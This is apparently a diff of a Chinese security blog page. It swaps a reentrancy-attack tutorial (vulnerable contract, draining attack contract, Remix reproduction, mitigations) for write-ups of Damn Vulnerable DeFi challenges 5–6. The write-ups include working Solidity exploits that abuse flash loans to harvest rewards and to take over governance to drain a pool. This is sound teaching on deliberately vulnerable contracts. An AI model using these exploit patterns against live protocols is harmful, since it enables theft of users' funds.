@@ -16,11 +16,11 @@
     <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
     <title>
         
-          ReentryAttack - Thomas_Xu
+          Damn Defi 题解 5-6 - Thomas_Xu
         
     </title>
 
-    <link rel="canonical" href="https://dusign.net/ReentryAttack/">
+    <link rel="canonical" href="https://dusign.net/DamnDefi-05-06/">
 
     <!-- Bootstrap Core CSS -->
     
@@ -90,7 +90,7 @@
     header.intro-header{
         
             
-                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('Iron-Man-3.jpg')
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('page1.png')
                 /*post*/
             
         
@@ -112,14 +112,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#基础漏洞" title="基础漏洞">基础漏洞</a>
+                              <a class="tag" href="/tags/#Damn Defi" title="Damn Defi">Damn Defi</a>
                             
                         </div>
-                        <h1>ReentryAttack</h1>
+                        <h1>Damn Defi 题解 5-6</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Thomas_Xu on
-                            2022-06-15
+                            2022-09-19
                         </span>
 
                         
@@ -263,59 +263,46 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="重入攻击分析"><a href="#重入攻击分析" class="headerlink" title="重入攻击分析"></a>重入攻击分析</h1><hr>
-<pre><code>author：Thomas_Xu
-</code></pre><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在以太坊中，智能合约能够调用其他外部合约的代码，由于智能合约可以调用外部合约或者发送以太币，这些操作需要合约提交外部的调用，所以这些合约外部的调用就可以被攻击者利用造成攻击劫持，使得被攻击合约在任意位置重新执行(回调)，绕过原代码中的限制条件，从而发生重入攻击。重入攻击本质上与编程里的递归调用类似，所以当合约将以太币发送到未知地址时就可能会发生。</p>
+                <h1 id="Damn-Defi靶场刷题记录-5-6"><a href="#Damn-Defi靶场刷题记录-5-6" class="headerlink" title="Damn Defi靶场刷题记录(5-6)"></a>Damn Defi靶场刷题记录(5-6)</h1><pre><code>author: Thomas_Xu
+</code></pre><h2 id="the-rewarder"><a href="#the-rewarder" class="headerlink" title="the-rewarder"></a>the-rewarder</h2><p>FlashPool从一开始就获得一百万个代币，提到的4个人中的每一个人都获得100个DVT，这些DVT立即由他们存入奖励池。在此初始设置之后，时间提前5天，并支付一轮奖励：每人25个奖励代币。<br>这道题有四个合约，是第一道多合约的题目。不过不用害怕，我们一个一个来分析。</p>
 <ul>
-<li><strong>发生条件</strong><ol>
-<li>调用了外部的合约且该合约是不安全的</li>
-<li>外部合约的函数调用早于状态变量的修改</li>
-</ol>
-</li>
-</ul>
-<p>接下来给大家展示的是一个最简单的提款函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function withdraw()&#123;</span><br><span class="line">  require(msg.sender,call.value(balances[msg.sender])());</span><br><span class="line">  balances[msg.sender]&#x3D;0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这种函数大多存在于钱包、去中心化交易所中，目的是为了让用户提款，将合约中的代币转换成通用的以太币。<br/></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code>在进入分析之前，先介绍几个基础知识
-</code></pre><ul>
-<li>以太坊常用的转账的方法<ol>
-<li>transfer()：只会发送 2300 gas 进行调用，当发送失败时会通过 throw 来进行回滚操作，从而防止了重入攻击。</li>
-<li>send()：只会发送 2300 gas 进行调用，当发送失败时会返回布尔值 false，从而防止了重入攻击。</li>
-<li>gas().call.vale()()：在调用时会发送所有的 gas，当发送失败时会返回布尔值 false，不能有效的防止重入攻击。</li>
-</ol>
-</li>
-<li><p>fallback函数<br>  回退函数 (fallback function)：回退函数是每个合约中有且仅有一个没有名字的函数，并且该函数无参数，无返回值，如下所示：</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function() public payable&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  回退函数在以下几种情况中被执行：</p>
-<ol>
-<li>调用合约时没有匹配到任何一个函数</li>
-<li>没有传数据</li>
-<li>智能合约收到以太币（为了接受以太币，fallback 函数必被标记为 payable）</li>
-</ol>
-</li>
-<li><p>漏洞<br>  通过我们对fallback函数的了解。<br>  如果我们构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）<br>  <img src="Reenter1.png" alt="攻击原理"><br>  我们先来看一段比较典型的有重入漏洞的合约：</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract Reentrance&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    function Reentrance()&#123;</span><br><span class="line">        _owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public payable&#123;</span><br><span class="line">        require(balances[msg.sender] &gt;&#x3D; amount);</span><br><span class="line">        require(this.balance &gt;&#x3D; amount);</span><br><span class="line">        &#x2F;&#x2F; 发送以太</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        &#x2F;&#x2F; 状态变量修改</span><br><span class="line">        balances[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address adre)constant returns(uint256)&#123;</span><br><span class="line">        return balances[adre];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet() constant returns(uint256 result)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  我们来看这个合约的 withdraw 函数，这个函数中的转账操作有一个外部调用（msg.sender.call.value(amount)()），所以我们就可以认为这个合约是可能有重入漏洞的，但是具体能否产生危害还需要更深入的分析：</p>
-<ul>
-<li>攻击者思路：<blockquote>
-<ol>
-<li>所有的外部调用都是不安全的且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用，这种隐藏的外部调用是否会造成危害呢？</li>
-<li>我们可以看到在 withdraw 函数中是先执行外部调用进行转账后才修改用户余额状态变量的，那我们可不可以在转账外部调用的时候构造一个恶意的逻辑合约在合约执行 balance[msg.sender] -= amount 之前一直循环调用 withdraw 函数一直提币从而将合约账户清空呢？</li>
-</ol>
+<li><strong>RewardToken</strong><br>这是一个简单的ERC20的Token，没有什么问题。唯一的区别就是这个奖励币可以被无限铸造。</li>
+<li><strong>AccountingToken</strong><br>这是一个有访问控制管理的具有交易快照功能的Token，应该是针对每一轮的奖励而写的Token。不过看上去也没有问题。</li>
+<li><strong>FlashLoanerPool</strong><br>这是比较常见的闪电贷池，让我们来具体看看它是怎么实现的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; liquidityToken.balanceOf(address(this));</span><br><span class="line">        require(amount &lt;&#x3D; balanceBefore, &quot;Not enough token balance&quot;);</span><br><span class="line"></span><br><span class="line">        require(msg.sender.isContract(), &quot;Borrower must be a deployed contract&quot;);</span><br><span class="line">        </span><br><span class="line">        liquidityToken.transfer(msg.sender, amount);</span><br><span class="line"></span><br><span class="line">        msg.sender.functionCall(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveFlashLoan(uint256)&quot;,</span><br><span class="line">                amount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        require(liquidityToken.balanceOf(address(this)) &gt;&#x3D; balanceBefore, &quot;Flash loan not paid back&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+明显的，出现了外部调用，这应该立马引起我们的警觉，这意味着我们可能利用<code>receiveFlashLoan()</code>函数干一些坏事。</li>
+<li><strong>TheRewarderPool</strong><br>这应该是这个系统最核心的合约了，里面有存款，奖励，取款的一系列流程。<blockquote>
+<p>存款会触发奖励分配功能。 首先检查是否经过了足够的时间来开始新一轮，如果是，它将创建快照。无论哪种方式，它都会根据他与所有其他用户的存款金额来计算呼叫者的奖励。然后，它检查调用方是否已经检索到当前回合的奖励，如果没有，则铸造计算出的奖励代币数量。</p>
 </blockquote>
 </li>
-<li>攻击合约：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">import&quot;.&#x2F;Reentrance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack&#123;</span><br><span class="line">    Reentrance re;</span><br><span class="line">    function ReentranceAttack(address _target) public payable&#123;</span><br><span class="line">        re &#x3D; Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet()view returns(uint256)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable &#123;</span><br><span class="line">        re.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        re.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        if (address(re).balance &gt;&#x3D; 1 ether)&#123;</span><br><span class="line">            re.withdraw(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>攻击原理：<br>  由于受害者合约withdraw函数使用call函数转账，会附加”所有可用gas”，并触发msg.sender的fallback函数。fallback 函数再次调用withdraw函数套利，由于withdraw函数最后一步才减去msg.sender对应的余额并记录导致递归调用withdraw函数require判断都能通过。直到合约中没有可用余额为止。<br>  类似于对攻击者fallback函数的递归调用<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2>首先用账户(<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>)模拟受害者，点击depoly开始部署。<br><img src="Reenter2.png" alt=""><br>然后将Value改为5，单位改为ether。点击deposit方法<br><img src="Reenter3.png" alt=""><br>查看当前账户余额为5ether，存款成功<br><img src="Reenter4.png" alt=""><br>创建一个新账户（<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>）来模拟攻击者，在Deploy处填写漏洞合约地址，部署攻击合约。<br><img src="Reenter5.png" alt=""><br>部署成功后，先查看攻击合约的wallet为0<br><img src="Reenter6.png" alt=""><br>攻击者先存款 1 ether 到漏洞合约中，这里设置 VALUE 为 1 ether，之后点击攻击合约的 deposit 进行存款。<br><img src="Reenter7.png" alt=""><br>再次调用漏洞合约的wallet方法，却发现有了6 ether<br><img src="Reenter8.png" alt=""><br>攻击者 (<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>) 调用攻击合约的 attack 函数模拟攻击，之后调用被攻击合约的 wallet 函数去查看合约的余额，发现已经归零，此时回到攻击合约查看余额，发现被攻击合约中的 6 ether 已经全部提款到了攻击者合约中，这就造成了重入攻击。<br><img src="Reenter9.png" alt=""></li>
 </ul>
-</li>
-</ul>
-<h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ul>
-<li><p><strong>加入防重入锁</strong><br>  下面是一个防重入锁的例子：</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyGuard &#123;</span><br><span class="line">    bool internal locked;</span><br><span class="line"></span><br><span class="line">    modifier noReentrant() &#123;</span><br><span class="line">        require(!locked, &quot;No re-entrancy&quot;);</span><br><span class="line">        locked &#x3D; true;</span><br><span class="line">        _; </span><br><span class="line">    locked &#x3D; false; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>写代码时需要遵循先判断，后写入变量在进行外部调用的编码规范（Checks-Effects-Interactions）</strong></p>
-</li>
-<li><p><strong>使用send() 和 transfer() 转币，只会传递2300Gas供调用，防止重入攻击。</strong></p>
+<p>在了解了工作原理之后，我注意到了这个问题：如果你的时间安排得当，并用你的存款开始新一轮，<strong>你可以立即领取该轮的奖励并退出</strong>。从另一份合同中完成所有这些操作，这意味着在一次交易中，您可以使用闪回符并索取大部分奖励。</p>
+<ul>
+<li><strong>Exploit</strong><br>闪电贷函数有一个外部调用可以被我们利用，而奖励池里我们只需要存款进去，就可以立即获取奖励并退出。<blockquote>
+<p>那么我们就可以从闪电贷池里jiu借钱存到奖励池里，领取奖励后取款，最后把钱还给借贷池就大功告成了。</p>
+</blockquote>
 </li>
 </ul>
+<p>来看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;FlashLoanerPool.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;TheRewarderPool.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RewarderExploit&#123;</span><br><span class="line"></span><br><span class="line">    FlashLoanerPool loanpool;</span><br><span class="line">    TheRewarderPool rewardpool;</span><br><span class="line">    RewardToken public immutable rewardToken;</span><br><span class="line">    DamnValuableToken public immutable liquidityToken;</span><br><span class="line">    address attacker;</span><br><span class="line"></span><br><span class="line">    constructor(address _loanpool, address _rewardpool, address _tokenAddress, address _rewardToken)&#123;</span><br><span class="line">        loanpool &#x3D; FlashLoanerPool(_loanpool);</span><br><span class="line">        rewardpool &#x3D; TheRewarderPool(_rewardpool);</span><br><span class="line">        liquidityToken &#x3D; DamnValuableToken(_tokenAddress);</span><br><span class="line">        rewardToken &#x3D; RewardToken(_rewardToken);</span><br><span class="line">        attacker &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 _amount) public &#123;</span><br><span class="line">        loanpool.flashLoan(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveFlashLoan(uint256 _amount) payable external&#123;</span><br><span class="line">        liquidityToken.approve(address(rewardpool), _amount);</span><br><span class="line">        rewardpool.deposit(_amount);</span><br><span class="line">        uint256 rewards &#x3D; rewardpool.distributeRewards();</span><br><span class="line">        rewardToken.transfer(attacker, rewards);</span><br><span class="line">        rewardpool.withdraw(_amount);</span><br><span class="line">        liquidityToken.transfer(address(loanpool), _amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>总结<br>这应该是所有希望激励用户存款的系统都会面临的漏洞（暂且叫闪借攻击吧），即使您为了防止来自闪借攻击，强制将回合开始（快照）放在与流动性存款不同的交易，拥有大量代币的用户仍然可以在一轮结束时存入它们，并在新一轮开始后立即提款。你的协议可能希望激励长期质押，而不是短期套利交易。<br>因此，最好是摆脱回合，根据存款的每一秒来计算奖励，就像今天许多现代DeFi项目所做的那样。</li>
+</ul>
+<h2 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h2><p>这个题和以往的题唯一不同的地方，就是多了一个治理机制。但同时，这个治理机制如果不安全，反而会适得其反。</p>
+<ul>
+<li><strong>SelfiePool</strong><br>这个池里有一个闪电贷的函数，同时有一个特殊的可以转出所有资金的函数<code>drainAllFunds()</code>。值得注意的是这个函数有一个修饰符<code>onlyGovernance</code>也就是只能被治理合约所调用，看起来非常安全，但其实我们一旦获得治理合约的控制权，我们就可以榨干<code>SelfiePool</code>.</li>
+<li><p><strong>SimpleGovernance</strong><br>这就是之前提到的治理合约，显而易见的是我们需要在这里面找到漏洞干一些坏事。让我们来看看吧。<br>  这个合约比较复杂，我们简单说一说</p>
+<ul>
+<li>queueAction<blockquote>
+<p>通过这个函数我们可以把data放进队列，而为了成功排队，我们必须拥有总供应量的一半以上，而由于我们现在有闪借池，这点很容易绕过。<br>  我们无法立即执行操作，因为有2天的延迟，我们必须先等待。但是，我们在这里所要做的就是将时间快进2天，因为没有什么可以确保我们在延迟期间仍然持有这些治理令牌</p>
+</blockquote>
+</li>
+<li>executeAction<br>这个函数使用来执行的，按照队列id一个交易一个交易的执行，但是这个函数明显是有借入风险的，我们只需要把作为参数传入的address改为我们想借入的合约地址，然后在排队的时候修改<code>data</code>的内容，很容易做到这一点。这样，我们就可以冒充治理合约来调用<code>drainAllFunds()</code>了。</li>
+</ul>
+</li>
+<li><p><strong>Exploit</strong><br>根据以上分析写出Exploit如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;SimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;SelfiePool.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfieExploit &#123;</span><br><span class="line"></span><br><span class="line">    SimpleGovernance public goverance;</span><br><span class="line">    SelfiePool public pool;</span><br><span class="line">    address attcker;</span><br><span class="line">    uint256 actionId;</span><br><span class="line">    constructor(address _pool, address _goverance)&#123;</span><br><span class="line">        pool &#x3D; SelfiePool(_pool);</span><br><span class="line">        goverance &#x3D; SimpleGovernance(_goverance);</span><br><span class="line">        attcker &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit (uint256 _amount) public &#123;</span><br><span class="line">        pool.flashLoan(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveTokens (address _token, uint256 amount) external &#123;</span><br><span class="line">        DamnValuableTokenSnapshot token &#x3D; DamnValuableTokenSnapshot(_token);</span><br><span class="line">        token.snapshot();</span><br><span class="line">        actionId &#x3D; goverance.queueAction(address(pool),</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;drainAllFunds(address)&quot;,</span><br><span class="line">                attcker</span><br><span class="line">            ),</span><br><span class="line">            0); </span><br><span class="line">        token.transfer(address(pool), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function drainToAttacker() external &#123;</span><br><span class="line">        goverance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>总结：治理合约越复杂，越可能出现漏洞，一定谨慎。</p>
 
                 
                 <hr>
@@ -323,12 +310,12 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/Uniswap的简介/" data-toggle="tooltip" data-placement="top" title="主流DES——Uniswap简介">&larr; Previous Post</a>
+                        <a href="/DamnDefi-07/" data-toggle="tooltip" data-placement="top" title="Damn Defi 题解 7">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/corpseFactory/" data-toggle="tooltip" data-placement="top" title="僵尸工厂学习记录">Next Post &rarr;</a>
+                        <a href="/DamnDefi-01-04/" data-toggle="tooltip" data-placement="top" title="Damn Defi 题解 1-4">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -452,7 +439,7 @@
           <strong class="toc-title">Contents</strong>
           
             
-              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#重入攻击分析"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">重入攻击分析</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞概述"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">漏洞概述</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞分析"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">漏洞分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞复现"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞防范"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">漏洞防范</span></a></li></ol></li></ol>
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Damn-Defi靶场刷题记录-5-6"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Damn Defi靶场刷题记录(5-6)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#the-rewarder"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">the-rewarder</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#Selfie"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">Selfie</span></a></li></ol></li></ol>
             
           
           </div>
@@ -474,7 +461,7 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#基础漏洞" title="基础漏洞">基础漏洞</a>
+                          <a class="tag" href="/tags/#Damn Defi" title="Damn Defi">Damn Defi</a>
                         
                     </div>
                 </section>
